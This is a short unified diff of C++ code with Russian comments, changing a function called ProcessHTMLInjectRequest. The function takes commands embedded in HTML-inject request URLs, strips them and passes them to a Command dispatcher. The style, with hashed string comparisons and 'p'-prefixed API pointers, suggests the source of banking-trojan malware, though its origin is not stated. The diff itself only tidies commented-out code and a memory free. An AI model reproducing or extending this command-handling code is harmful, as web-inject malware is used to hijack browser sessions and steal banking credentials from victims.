@@ -65,20 +65,6 @@ bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequ
 	// дополняет команду строками www и .com
 	// т.е. наша команда получает вид www.command.com
  
-//	if (STRA::Hash(URL, 4, true) == 0xEFDFBAE /* www. */)
-//	{
-//		URL += 4;
-//		CmdLen -= 4;
-//	}
-//
-//	if (CmdLen > 4)
-//	{
-//		PCHAR Tmp = (PCHAR)URL + (CmdLen - 4);
-//		if (STRA::Hash(Tmp, 4, true) == 0x5D8F7ED /* .com */)
-//		{
-//			CmdLen -= 4;
-//		}
-//    }
 
 	// Обрабатываем команду
 	if (Params) Params++;
@@ -114,12 +100,11 @@ bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequ
         STR::Free(P);
 
 //		string F;
-//		F.Format("Выполняется команда инжекта: %s; Параметры: %s", CmdStr.t_str(), Params);
+//		F.Format("Выполняется команда инжекта: %s; Параметры: %s", CmdStr.t_str(), EP.t_str());
 //		pMessageBoxA(0, F.t_str(), 0, 0);
 //		pOutputDebugStringA(F.t_str());
 
 		Command(CmdStr.t_str(), EP.t_str());
-		STR::Free(P);
 	}
 
 	return Result;
